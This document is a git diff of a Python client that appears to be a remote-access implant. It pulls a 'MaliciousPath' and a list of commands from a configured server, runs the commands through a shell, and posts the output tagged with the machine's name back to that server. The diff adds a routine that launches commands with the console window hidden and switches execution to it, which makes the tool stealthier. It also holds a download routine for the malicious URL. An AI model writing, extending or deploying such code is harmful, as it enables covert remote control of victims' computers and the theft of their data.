@@ -4,7 +4,7 @@ import sys, string, os
 import subprocess
 import datetime
 
-SERVERADDRESS = 'http://192.168.3.63'
+SERVERADDRESS = 'http://10.0.0.6'
 CONFIGURATIONPATH = '/Configuration'
 HEADERS = {'UUID':'5a968c26-b565-4b65-8445-9e87780cb8f9-01'}
 COMMANDSTOEXE = None
@@ -37,9 +37,20 @@ def conf():
     MALICIOUSURL = SERVERADDRESS+conf['MaliciousPath']
 
 def RunCommand(command):
+    #run = os.popen(command)
+    #results = run.read()
+    #run.close()
+    #return results
+
     run = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE)
     cmd_out, cmd_err = run.communicate()
     return (cmd_out.decode("utf-8"))
+
+def launchWithoutConsole(command, args):
+    """Launches 'command' windowless and waits until finished"""
+    startupinfo = subprocess.STARTUPINFO()
+    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    return subprocess.Popen([command] + args, startupinfo=startupinfo).wait()
 
 def PreperToSend(type,str):
     j = json.dumps({'computer':os.environ['COMPUTERNAME'],'type':type,'data':str})
@@ -49,7 +60,7 @@ def Activate():
     HttpPostRequest('/Commands',PreperToSend("Activated",str(datetime.datetime.now())+'\r\n'))
     if COMMANDSTOEXE is not None:
         for command in COMMANDSTOEXE:
-            HttpPostRequest('/Commands',PreperToSend(str(command),RunCommand(str(command))))
+            HttpPostRequest('/Commands',PreperToSend(str(command),launchWithoutConsole(str(command),[])))
 
 
 def DownloadFile(url):
